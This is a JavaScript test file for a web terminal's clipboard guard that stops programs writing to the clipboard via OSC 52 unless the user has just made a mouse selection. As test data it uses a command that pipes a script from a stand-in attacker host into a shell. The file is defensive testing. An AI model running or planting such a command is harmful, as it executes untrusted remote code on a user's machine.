// node --test osc52.test.mjs (the image build runs it before building the page).
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { test } from 'node:test'
import vm from 'node:vm'

// osc52.js is a plain page script; run it in a context of its own and take
// what it defines.
const context = {}
vm.runInNewContext(readFileSync(new URL('osc52.js', import.meta.url), 'utf8'), context)
const { javoClipboardGuard } = context

function setUp() {
  let clock = 10_000
  const written = []
  const asked = []
  const guard = javoClipboardGuard({
    now: () => clock,
    write: (text) => written.push(text),
    ask: (text) => asked.push(text),
  })
  return { guard, written, asked, tick: (ms) => (clock += ms) }
}

const attack = 'curl https://evil.example/x | sh\n'

test('a write no selection asked for is not made: the user is asked', () => {
  const { guard, written, asked } = setUp()
  guard.offer(attack)
  assert.deepEqual(written, [])
  assert.deepEqual(asked, [attack])
})

test('a mouse drag that ends a selection lets the copy that follows through', () => {
  const { guard, written, asked, tick } = setUp()
  guard.pointerDown(100, 100)
  tick(300)
  guard.pointerUp(160, 100, 1)
  tick(50)
  guard.offer('selected text')
  assert.deepEqual(written, ['selected text'])
  assert.deepEqual(asked, [])
})

test('a double or triple click selects too', () => {
  for (const clicks of [2, 3]) {
    const { guard, written } = setUp()
    guard.pointerDown(100, 100)
    guard.pointerUp(100, 100, clicks)
    guard.offer('word')
    assert.deepEqual(written, ['word'], `${clicks} clicks`)
  }
})

test('a plain click is not a selection, nor is typing', () => {
  const { guard, written, asked } = setUp()
  guard.pointerDown(100, 100)
  guard.pointerUp(101, 101, 1)
  guard.offer(attack)
  assert.deepEqual(written, [])
  assert.deepEqual(asked, [attack])
})

test('a selection admits one write, soon after it', () => {
  const late = setUp()
  late.guard.pointerDown(0, 0)
  late.guard.pointerUp(50, 0, 1)
  late.tick(1500)
  late.guard.offer(attack)
  assert.deepEqual(late.written, [])

  const twice = setUp()
  twice.guard.pointerDown(0, 0)
  twice.guard.pointerUp(50, 0, 1)
  twice.guard.offer('selected text')
  twice.guard.offer(attack)
  assert.deepEqual(twice.written, ['selected text'])
  assert.deepEqual(twice.asked, [attack])
})

test('a release without a press in the terminal is not a drag', () => {
  const { guard, written } = setUp()
  guard.pointerUp(500, 500, 1)
  guard.offer(attack)
  assert.deepEqual(written, [])
})
